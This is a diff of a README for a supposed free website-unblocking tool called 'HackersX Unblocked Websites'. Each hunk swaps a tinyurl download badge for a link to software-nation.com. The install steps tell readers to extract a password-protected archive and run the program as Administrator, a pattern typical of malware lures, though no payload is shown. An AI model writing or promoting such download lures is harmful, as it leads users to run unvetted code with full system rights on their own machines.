@@ -9,7 +9,7 @@ The **🌐 HackersX Unblocked Websites** is a **free** internet freedom tool tha
 
 <div align="center">
 
-[![Download HackersX Unblocked Websites](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hackersx-unblocked-websites)
+[![Download HackersX Unblocked Websites](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hackersx-unblocked-websites)
 
 </div>
 
@@ -95,7 +95,7 @@ Network restrictions can block access to legitimate educational resources. This 
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Enter blocked URL → Click "Unblock"
 
-[![Download HackersX Unblocked Websites](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hackersx-unblocked-websites)
+[![Download HackersX Unblocked Websites](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hackersx-unblocked-websites)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -236,7 +236,7 @@ Access blocked educational content for free. **HackersX Unblocked Websites** hel
 
 <div align="center">
 
-[![Download HackersX Unblocked Websites](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hackersx-unblocked-websites)
+[![Download HackersX Unblocked Websites](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hackersx-unblocked-websites)
 
 **Version 4.6.1** — Educational internet freedom tool. April 2026 update. Zero cost. No payment.
 
